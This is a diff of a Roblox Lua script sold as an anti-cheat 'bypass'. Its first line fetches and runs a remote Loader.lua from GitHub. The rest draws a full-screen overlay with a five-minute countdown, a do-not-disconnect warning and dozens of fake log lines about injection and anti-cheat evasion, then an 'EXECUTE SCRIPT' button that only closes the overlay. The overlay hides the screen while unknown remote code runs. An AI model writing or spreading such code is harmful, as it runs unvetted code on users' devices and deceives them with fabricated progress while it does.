@@ -1,30 +1,25 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MrLolhack/ESCAPETSUNAMIFORBRAINROTSt3l/refs/heads/main/Loader.lua"))()
--- Services
 local TweenService = game:GetService("TweenService")
 local RunService = game:GetService("RunService")
 local CoreGui = game:GetService("CoreGui")
 
--- Configuration
-local TOTAL_TIME = 300 -- 5 minutes
-local ACCENT_COLOR = Color3.fromRGB(255, 80, 200) -- Hot Neon Pink
-local GLOW_COLOR = Color3.fromRGB(160, 32, 240)  -- Deep Purple
-local BG_COLOR = Color3.fromRGB(10, 5, 15)      -- Near Black
+local TOTAL_TIME = 300
+local ACCENT_COLOR = Color3.fromRGB(255, 80, 200)
+local GLOW_COLOR = Color3.fromRGB(160, 32, 240)
+local BG_COLOR = Color3.fromRGB(10, 5, 15)
 
--- UI Root
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "OrchidBypass_Pro"
 ScreenGui.IgnoreGuiInset = true
 ScreenGui.DisplayOrder = 999999
 ScreenGui.Parent = CoreGui
 
--- Main Full-Screen Overlay
 local MainFrame = Instance.new("Frame")
 MainFrame.Size = UDim2.fromScale(1, 1)
 MainFrame.BackgroundColor3 = BG_COLOR
 MainFrame.BorderSizePixel = 0
 MainFrame.Parent = ScreenGui
 
--- Matrix Background (Pink Variant)
 local function createMatrixRain()
     local char = Instance.new("TextLabel")
     char.Size = UDim2.fromOffset(20, 20)
@@ -51,9 +46,8 @@ task.spawn(function()
     end
 end)
 
--- Central Glass Panel
 local Panel = Instance.new("Frame")
-Panel.Size = UDim2.fromOffset(480, 580)
+Panel.Size = UDim2.fromOffset(480, 620)
 Panel.Position = UDim2.fromScale(0.5, 0.5)
 Panel.AnchorPoint = Vector2.new(0.5, 0.5)
 Panel.BackgroundColor3 = Color3.fromRGB(25, 15, 35)
@@ -70,18 +64,16 @@ PanelGlow.Color = ACCENT_COLOR
 PanelGlow.Transparency = 0.2
 PanelGlow.Parent = Panel
 
--- Title Section
 local Title = Instance.new("TextLabel")
 Title.Size = UDim2.new(1, 0, 0, 60)
 Title.Position = UDim2.new(0, 0, 0, 15)
 Title.BackgroundTransparency = 1
-Title.Text = "BYPASSING Loading Script"
+Title.Text = "Error Hub BYPASS V3"
 Title.TextColor3 = Color3.new(1, 1, 1)
 Title.Font = Enum.Font.GothamBold
 Title.TextSize = 26
 Title.Parent = Panel
 
--- Status & Timer Labels
 local StatusLabel = Instance.new("TextLabel")
 StatusLabel.Size = UDim2.new(1, 0, 0, 20)
 StatusLabel.Position = UDim2.new(0, 0, 0, 75)
@@ -102,25 +94,23 @@ TimerLabel.Font = Enum.Font.Code
 TimerLabel.TextSize = 13
 TimerLabel.Parent = Panel
 
--- Seamless Console (No lines between logs)
 local ConsoleFrame = Instance.new("ScrollingFrame")
-ConsoleFrame.Size = UDim2.new(0.9, 0, 0, 260)
+ConsoleFrame.Size = UDim2.new(0.9, 0, 0, 240)
 ConsoleFrame.Position = UDim2.new(0.05, 0, 0, 130)
 ConsoleFrame.BackgroundColor3 = Color3.fromRGB(15, 10, 20)
 ConsoleFrame.BackgroundTransparency = 0.6
 ConsoleFrame.BorderSizePixel = 0
-ConsoleFrame.ScrollBarThickness = 0 -- Hidden for smoothness
+ConsoleFrame.ScrollBarThickness = 0
 ConsoleFrame.Parent = Panel
 
 local ConsoleLayout = Instance.new("UIListLayout")
 ConsoleLayout.SortOrder = Enum.SortOrder.LayoutOrder
-ConsoleLayout.Padding = UDim.new(0, 0) -- Seamless removal of lines
+ConsoleLayout.Padding = UDim.new(0, 0)
 ConsoleLayout.Parent = ConsoleFrame
 
--- Loading Bar Container
 local BarContainer = Instance.new("Frame")
 BarContainer.Size = UDim2.new(0.85, 0, 0, 6)
-BarContainer.Position = UDim2.new(0.075, 0, 0, 420)
+BarContainer.Position = UDim2.new(0.075, 0, 0, 390)
 BarContainer.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
 BarContainer.BorderSizePixel = 0
 BarContainer.Parent = Panel
@@ -135,10 +125,9 @@ local BarGradient = Instance.new("UIGradient")
 BarGradient.Color = ColorSequence.new(ACCENT_COLOR, GLOW_COLOR)
 BarGradient.Parent = BarFill
 
--- Progress Text
 local ProgressPercent = Instance.new("TextLabel")
 ProgressPercent.Size = UDim2.new(1, 0, 0, 30)
-ProgressPercent.Position = UDim2.new(0, 0, 0, 435)
+ProgressPercent.Position = UDim2.new(0, 0, 0, 405)
 ProgressPercent.BackgroundTransparency = 1
 ProgressPercent.Text = "0%"
 ProgressPercent.TextColor3 = ACCENT_COLOR
@@ -146,10 +135,33 @@ ProgressPercent.Font = Enum.Font.GothamBold
 ProgressPercent.TextSize = 20
 ProgressPercent.Parent = Panel
 
--- Warning
+local LaunchButton = Instance.new("TextButton")
+LaunchButton.Name = "ExecutionButton"
+LaunchButton.Size = UDim2.new(0.85, 0, 0, 50)
+LaunchButton.Position = UDim2.new(0.075, 0, 0, 450)
+LaunchButton.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
+LaunchButton.BorderSizePixel = 0
+LaunchButton.Font = Enum.Font.GothamBold
+LaunchButton.Text = "LOCKED (05:00)"
+LaunchButton.TextColor3 = Color3.new(0.4, 0.4, 0.4)
+LaunchButton.TextSize = 16
+LaunchButton.AutoButtonColor = false
+LaunchButton.ClipsDescendants = true
+LaunchButton.Parent = Panel
+
+local BtnCorner = Instance.new("UICorner")
+BtnCorner.CornerRadius = UDim.new(0, 8)
+BtnCorner.Parent = LaunchButton
+
+local BtnStroke = Instance.new("UIStroke")
+BtnStroke.Thickness = 2
+BtnStroke.Color = Color3.fromRGB(60, 40, 80)
+BtnStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+BtnStroke.Parent = LaunchButton
+
 local Warning = Instance.new("TextLabel")
 Warning.Size = UDim2.new(0.9, 0, 0, 40)
-Warning.Position = UDim2.new(0.05, 0, 0, 500)
+Warning.Position = UDim2.new(0.05, 0, 0, 550)
 Warning.BackgroundTransparency = 1
 Warning.Text = "SYSTEM: Do not disconnect. Premature exit may trigger anti-cheat flag. Synchronizing modules..."
 Warning.TextColor3 = Color3.fromRGB(180, 120, 220)
@@ -158,48 +170,90 @@ Warning.TextSize = 12
 Warning.TextWrapped = true
 Warning.Parent = Panel
 
--- Logic: Helper Functions
 local function formatTime(s)
     local mins = math.floor(s / 60)
     local secs = s % 60
-    return string.format("ESTIMATED TIME: %02d:%02d", mins, secs)
+    return string.format("%02d:%02d", mins, secs)
 end
 
 local logQueue = {
-    {t = "> Fetching bypass_core.dll from remote...", c = Color3.new(1,1,1)},
-    {t = "> [SUCCESS] Module 'Orchid' downloaded.", c = Color3.fromRGB(150, 255, 150)},
-    {t = "> Scanning game memory for integrity checks...", c = Color3.fromRGB(180, 180, 255)},
-    {t = "> Hooking LuaU virtual machine...", c = Color3.fromRGB(255, 150, 255)},
-    {t = "> WARNING: Obfuscation layer detected. Decrypting...", c = Color3.fromRGB(255, 200, 100)},
-    {t = "> Memory patch applied at 0x7FF8A2", c = Color3.fromRGB(200, 200, 200)},
+    {t = "> Fetching bypass_core.dll...", c = Color3.new(1,1,1)},
+    {t = "> [SUCCESS] Module 'Orchid' loaded.", c = Color3.fromRGB(150, 255, 150)},
+    {t = "> Scanning memory addresses...", c = Color3.fromRGB(180, 180, 255)},
+    {t = "> Hooking LuaU VM...", c = Color3.fromRGB(255, 150, 255)},
+    {t = "> WARNING: Obfuscation detected...", c = Color3.fromRGB(255, 200, 100)},
+    {t = "> Memory patch @ 0x7FF8A2", c = Color3.fromRGB(200, 200, 200)},
     {t = "> Spoofing client environment...", c = Color3.new(1,1,1)},
-    {t = "> Bypassing server-side heartbeats...", c = Color3.fromRGB(255, 100, 150)},
-    {t = "> Intercepting RemoteEvent traffic...", c = Color3.fromRGB(100, 200, 255)},
-    {t = "> Overriding environment getgenv()...", c = Color3.fromRGB(255, 255, 100)},
-    {t = "> Injecting shellcode into task scheduler...", c = Color3.fromRGB(200, 100, 255)},
-    {t = "> Nullifying anti-cheat callback loops...", c = Color3.fromRGB(255, 80, 80)},
-    {t = "> Establishing encrypted tunnel [AES-256]...", c = Color3.fromRGB(150, 255, 150)},
-    {t = "> Patching '__index' metamethod hooks...", c = Color3.fromRGB(100, 255, 200)},
-    {t = "> Disabling client-side logging service...", c = Color3.fromRGB(200, 200, 200)},
-    {t = "> Redirecting crash dumps to /dev/null...", c = Color3.fromRGB(170, 170, 170)},
-    {t = "> Validating hardware ID spoofing...", c = Color3.fromRGB(100, 150, 255)},
-    {t = "> Resolving internal pointer addresses...", c = Color3.fromRGB(220, 220, 220)},
-    {t = "> Bypassing Roblox security heartbeat...", c = Color3.fromRGB(255, 120, 180)},
-    {t = "> Masking execution signature...", c = Color3.fromRGB(150, 150, 255)},
-    {t = "> [OK] VM entry point modified.", c = Color3.fromRGB(100, 255, 100)},
-    {t = "> Cleaning stack trace for stealth...", c = Color3.fromRGB(255, 255, 255)},
-    {t = "> Manipulating register states...", c = Color3.fromRGB(200, 150, 255)},
-    {t = "> Syncing with local asset cache...", c = Color3.fromRGB(150, 255, 255)},
-    {t = "> Analyzing dynamic library dependencies...", c = Color3.fromRGB(230, 230, 230)},
-    {t = "> [WARN] Unrecognized opcode detected. Ignoring...", c = Color3.fromRGB(255, 180, 50)},
-    {t = "> Bypassing Hyperion user-mode checks...", c = Color3.fromRGB(255, 50, 50)},
-    {t = "> Injecting custom exploit API...", c = Color3.fromRGB(100, 255, 100)},
-    {t = "> Mapping virtual memory segments...", c = Color3.fromRGB(180, 180, 180)},
-    {t = "> Obfuscating script metadata...", c = Color3.fromRGB(255, 100, 255)},
-    {t = "> Locking memory constants...", c = Color3.fromRGB(100, 100, 255)},
-    {t = "> Waiting for game engine stability...", c = Color3.fromRGB(255, 255, 150)},
-    {t = "> Establishing bypass handshake...", c = Color3.fromRGB(150, 255, 180)},
-    {t = "> Finalizing module alignment...", c = Color3.fromRGB(200, 200, 255)}
+    {t = "> Bypassing server heartbeats...", c = Color3.fromRGB(255, 100, 150)},
+    {t = "> Intercepting RemoteEvents...", c = Color3.fromRGB(100, 200, 255)},
+    {t = "> Overriding getgenv()...", c = Color3.fromRGB(255, 255, 100)},
+    {t = "> Initializing bypass kernel...", c = Color3.new(1,1,1)},
+    {t = "> Loading stealth modules...", c = Color3.fromRGB(180,255,180)},
+    {t = "> Checking exploit environment...", c = Color3.fromRGB(200,200,255)},
+    {t = "> Injecting runtime hooks...", c = Color3.fromRGB(255,150,255)},
+    {t = "> Resolving memory pointers...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Patching network layer...", c = Color3.fromRGB(150,220,255)},
+    {t = "> Bypassing anti-cheat scan #1...", c = Color3.fromRGB(255,180,120)},
+    {t = "> Bypassing anti-cheat scan #2...", c = Color3.fromRGB(255,180,120)},
+    {t = "> Bypassing anti-cheat scan #3...", c = Color3.fromRGB(255,180,120)},
+    {t = "> Allocating virtual memory...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Mapping executable pages...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Hook installed: getrawmetatable()", c = Color3.fromRGB(120,255,200)},
+    {t = "> Hook installed: firetouchinterest()", c = Color3.fromRGB(120,255,200)},
+    {t = "> Hook installed: sethiddenproperty()", c = Color3.fromRGB(120,255,200)},
+    {t = "> Hook installed: getconnections()", c = Color3.fromRGB(120,255,200)},
+    {t = "> Decrypting payload layer 1...", c = Color3.fromRGB(255,220,120)},
+    {t = "> Decrypting payload layer 2...", c = Color3.fromRGB(255,220,120)},
+    {t = "> Decrypting payload layer 3...", c = Color3.fromRGB(255,220,120)},
+    {t = "> Executing bootstrap routine...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Synchronizing exploit threads...", c = Color3.fromRGB(180,180,255)},
+    {t = "> Initializing packet interceptor...", c = Color3.fromRGB(120,200,255)},
+    {t = "> Spoofing hardware fingerprint...", c = Color3.fromRGB(255,150,150)},
+    {t = "> Masking exploit signature...", c = Color3.fromRGB(255,150,150)},
+    {t = "> Verifying sandbox integrity...", c = Color3.fromRGB(200,200,255)},
+    {t = "> Building runtime environment...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Loading Orchid extension pack...", c = Color3.fromRGB(150,255,150)},
+    {t = "> Module Orchid::Core loaded", c = Color3.fromRGB(150,255,150)},
+    {t = "> Module Orchid::Memory loaded", c = Color3.fromRGB(150,255,150)},
+    {t = "> Module Orchid::Security loaded", c = Color3.fromRGB(150,255,150)},
+    {t = "> Resolving exploit permissions...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Establishing remote bridge...", c = Color3.fromRGB(150,220,255)},
+    {t = "> Injecting bytecode...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Executing bytecode layer...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Scanning game memory...", c = Color3.fromRGB(180,180,255)},
+    {t = "> Found protected region...", c = Color3.fromRGB(255,150,120)},
+    {t = "> Attempting bypass...", c = Color3.fromRGB(255,200,120)},
+    {t = "> Patch applied successfully", c = Color3.fromRGB(150,255,150)},
+    {t = "> Rebuilding LuaU instruction map...", c = Color3.fromRGB(200,200,255)},
+    {t = "> Synchronizing exploit clock...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Initializing debug hooks...", c = Color3.fromRGB(180,255,200)},
+    {t = "> Injecting stealth thread...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Starting memory watcher...", c = Color3.fromRGB(180,180,255)},
+    {t = "> Encrypting communication channel...", c = Color3.fromRGB(255,220,120)},
+    {t = "> Loading UI modules...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Preparing runtime executor...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Building execution context...", c = Color3.fromRGB(200,200,255)},
+    {t = "> Resolving environment variables...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Installing metatable hooks...", c = Color3.fromRGB(180,255,200)},
+    {t = "> Redirecting __index calls...", c = Color3.fromRGB(180,255,200)},
+    {t = "> Redirecting __namecall...", c = Color3.fromRGB(180,255,200)},
+    {t = "> Monitoring network traffic...", c = Color3.fromRGB(120,200,255)},
+    {t = "> Packet signature verified", c = Color3.fromRGB(150,255,150)},
+    {t = "> Injecting anti-detection routines...", c = Color3.fromRGB(255,180,180)},
+    {t = "> Hiding exploit threads...", c = Color3.fromRGB(255,180,180)},
+    {t = "> Cleaning debug traces...", c = Color3.fromRGB(200,200,200)},
+    {t = "> Memory integrity confirmed", c = Color3.fromRGB(150,255,150)},
+    {t = "> Launching runtime payload...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Starting script virtualization...", c = Color3.fromRGB(200,200,255)},
+    {t = "> Emulator environment detected", c = Color3.fromRGB(255,200,120)},
+    {t = "> Applying compatibility patch...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Resolving exploit APIs...", c = Color3.fromRGB(200,200,255)},
+    {t = "> Executor bridge established", c = Color3.fromRGB(150,255,150)},
+    {t = "> Runtime sandbox ready", c = Color3.fromRGB(150,255,150)},
+    {t = "> Injecting command handler...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Preparing final payload...", c = Color3.fromRGB(255,220,120)},
+    {t = "> Executing final stage...", c = Color3.fromRGB(200,255,200)},
+    {t = "> Orchid bypass initialized successfully.", c = Color3.fromRGB(120,255,180)}
 }
 
 local function addLog()
@@ -213,12 +267,18 @@ local function addLog()
     log.TextSize = 13
     log.TextXAlignment = Enum.TextXAlignment.Left
     log.Parent = ConsoleFrame
-    
     ConsoleFrame.CanvasSize = UDim2.new(0, 0, 0, ConsoleLayout.AbsoluteContentSize.Y)
     ConsoleFrame.CanvasPosition = Vector2.new(0, ConsoleFrame.CanvasSize.Y.Offset)
 end
 
--- Main Loop
+local canExecute = false
+LaunchButton.MouseButton1Click:Connect(function()
+    if canExecute then
+        local CoreGui = game:GetService("CoreGui")
+        ScreenGui:Destroy()
+    end
+end)
+
 local start = tick()
 task.spawn(function()
     while tick() - start < TOTAL_TIME do
@@ -226,41 +286,36 @@ task.spawn(function()
         local progress = elapsed / TOTAL_TIME
         local remaining = math.max(0, TOTAL_TIME - elapsed)
         
-        -- Update UI
         BarFill.Size = UDim2.fromScale(progress, 1)
         ProgressPercent.Text = math.floor(progress * 100) .. "%"
-        TimerLabel.Text = formatTime(math.floor(remaining))
+        TimerLabel.Text = "ESTIMATED TIME: " .. formatTime(math.floor(remaining))
+        LaunchButton.Text = "LOCKED (" .. formatTime(math.floor(remaining)) .. ")"
         
-        -- Update Status Phase
         if progress < 0.3 then
-            StatusLabel.Text = "Downloading Script Modules (" .. math.floor(progress * 333) .. "kb/s)..."
+            StatusLabel.Text = "Downloading Script Modules..."
         elseif progress < 0.8 then
             StatusLabel.Text = "Injecting Bypass Hooks..."
         else
             StatusLabel.Text = "Finalizing Script Execution..."
         end
         
-        -- Random Logs
-        if math.random(1, 15) == 1 then
-            addLog()
-        end
-        
-        -- Glitch Warning Effect
+        if math.random(1, 15) == 1 then addLog() end
         Warning.TextTransparency = 0.2 + (math.sin(tick() * 5) * 0.2)
-        
         task.wait(0.1)
     end
     
-    -- Completion
-    StatusLabel.Text = "Script Bypass Completed"
+    canExecute = true
+    StatusLabel.Text = "Bypass Ready"
     StatusLabel.TextColor3 = Color3.fromRGB(150, 255, 150)
-    addLog("> [FINISH] Script injected successfully.")
+    LaunchButton.Text = "EXECUTE SCRIPT"
+    LaunchButton.TextColor3 = Color3.new(1, 1, 1)
+    LaunchButton.BackgroundColor3 = ACCENT_COLOR
+    BtnStroke.Color = Color3.new(1, 1, 1)
     
-    task.wait(3)
-    ScreenGui:Destroy()
+    local pulse = TweenService:Create(LaunchButton, TweenInfo.new(0.8, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {BackgroundColor3 = GLOW_COLOR})
+    pulse:Play()
 end)
 
--- Pulse Panel Glow
 task.spawn(function()
     while true do
         TweenService:Create(PanelGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut, -1, true), {Transparency = 0.6}):Play()
